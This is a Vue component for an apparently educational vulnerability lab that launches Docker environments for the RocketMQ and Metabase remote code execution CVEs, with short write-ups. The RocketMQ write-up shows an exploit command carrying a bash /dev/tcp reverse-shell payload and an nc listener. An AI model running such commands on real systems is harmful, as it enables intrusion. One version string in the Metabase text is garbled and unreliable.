<script setup>

import { ref, onMounted } from 'vue';


const isLoading = ref({
    testRCE: false,
    test2: false,
});
const imagePath = ref('');

// 从本地存储中获取初始状态
const RCE_DockerComposeUp = ref(localStorage.getItem('RCE_DockerComposeUp') === 'true');
const RCE_test2Up = ref(localStorage.getItem('RCE_test2Up') === 'true');

const testRCE = 'CVE-2023-33246';
const test2 = 'CVE-2023-38646';

const toggleDockerCompose = async (directory) => {
    try {
        isLoading.value[directory] = true;

        if (directory === testRCE) {

            if (RCE_DockerComposeUp.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);
            }
            RCE_DockerComposeUp.value = !RCE_DockerComposeUp.value;

            // 存储按钮状态
            localStorage.setItem('RCE_DockerComposeUp', RCE_DockerComposeUp.value);
        }

        // test2
        if (directory === test2) {

            if (RCE_test2Up.value) {
                await stopEnvironment(directory);
            } else {
                await startEnvironment(directory);

            }
            RCE_test2Up.value = !RCE_test2Up.value;

            localStorage.setItem('RCE_test2Up', RCE_test2Up.value);
        }

    } catch (error) {

        console.error('Error toggling Docker Compose:', error);

    } finally {

        isLoading.value[directory] = false;

    }
};

const startEnvironment = async (directory) => {
    try {
        const response = await axios.post('/startEnvironment', { directory });
        imagePath.value = response.data.imagePath;

    } catch (error) {
        console.error('Error starting environment:', error);
    }
};

const stopEnvironment = async (directory) => {
    try {
        await axios.post('/stopEnvironment', { directory });
    } catch (error) {
        console.error('Error stopping environment:', error);
    }
};

onMounted(() => {
    // 组件加载后从本地存储中恢复按钮状态
    RCE_DockerComposeUp.value = localStorage.getItem('RCE_DockerComposeUp') === 'true';
    RCE_test2Up.value = localStorage.getItem('RCE_test2Up') === 'true';
});

</script>


<template>
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">RCE Environment</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="#">Home</a></li>
                        <li class="breadcrumb-item"><a href="#">RCE</a></li>
                        <li class="breadcrumb-item active">RCE Environment</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>


    <div class="content">
        <div class="container-fluid">
            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-33246 Apache RocketMQ 命令执行漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">
                        RocketMQ是一款低延迟、高并发、高可用、高可靠的分布式消息中间件。漏洞消息为：RocketMQ的NameServer、Broker、Controller等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。
                    </p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">
                        Apache RocketMQ &lt;= 5.1.0<br> Apache RocketMQ &lt;=4.9.5</p>

                    <button @click="toggleDockerCompose(testRCE)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="RCE_DockerComposeUp ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[testRCE]">
                        <div v-if="isLoading[testRCE]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ RCE_DockerComposeUp ? '关闭环境' : '启动环境' }}</span>
                    </button>

                    <div v-if="RCE_DockerComposeUp && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>

                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">

                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>

                </div>
                <div class="card-body">

                    <h5 class="title">git clone https://github.com/Serendipity-Lucky/CVE-2023-33246.git </h5>

                    <h5 class="title">java -jar CVE-2023-33246.jar -ip "127.0.0.1" -cmd "bash -i
                        >&/dev/tcp/192.168.146.130/1234 0>&1"</h5>
                    <img src="/images/RMQ.png" style="max-width: 80%; height: auto;">
                    <h5 class="title">在CentOS7服务器上开启监听1234端口：nc -lvnp 1234</h5>
                    <img src="/images/RMQ1.png" style="max-width: 80%; height: auto;">

                </div>
            </div>

            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h5 class="m-0">CVE-2023-38646 Metabase命令执行漏洞</h5>
                </div>
                <div class="card-body">
                    <h6 class="card-title">漏洞介绍</h6>
                    <p class="card-text">
                        一个开源的数据分析和可视化工具，它可以帮助用户轻松地连接到各种数据源，包括数据库、云服务和API，然后使用直观的界面进行数据查询、分析和可视化。漏洞信息为：在1.46.6.1之前的Metadata开源和www.example.com之前的Metadata
                        Enterprise允许攻击者在服务器上以服务器的权限级别执行任意命令。
                    </p>
                    <h6 class="card-title">影响版本</h6>
                    <p class="card-text">Metabase&lt; 0.46.6.1<br>Metabase Enterprise&lt; 1.46.6.1
                    </p>

                    <button @click="toggleDockerCompose(test2)" type="button" class="btn card-link"
                        style="min-width: 100px;" :class="RCE_test2Up ? 'bg-maroon' : 'btn-primary'"
                        :disabled="isLoading[test2]">
                        <div v-if="isLoading[test2]" class="spinner-border spinner-border-sm" role="status"
                            aria-hidden="true">
                            <span class="sr-only">Loading...</span>
                        </div>
                        <span v-else>{{ RCE_test2Up ? '关闭环境' : '启动环境' }}</span>
                    </button>
                    <div v-if="RCE_test2Up && imagePath">
                        <p>您可以访问环境：{{ imagePath }}</p>
                    </div>

                </div>
            </div>
            <div class="card collapsed-card">
                <div class="card-header">
                    <h3 class="card-title">Write up</h3>
                    <div class="card-tools">

                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                class="fas fa-plus"></i></button>
                    </div>

                </div>
                <div class="card-body">

                    <h5 class="title">访问：127.0.0.1:3001/api/session/properties</h5>

                    <h5 class="title">获取setup-token</h5>
                    <img src="/images/Mbase.png" style="max-width: 80%; height: auto;">
                    <h5 class="title">POC</h5>
                    <img src="/images/Mbase1.png" style="max-width: 80%; height: auto;">
                    <h5 class="title">测试Dnslog回显</h5>
                    <img src="/images/Mbase2.png" style="max-width: 80%; height: auto;">

                </div>
            </div>
        </div>
    </div>
</template>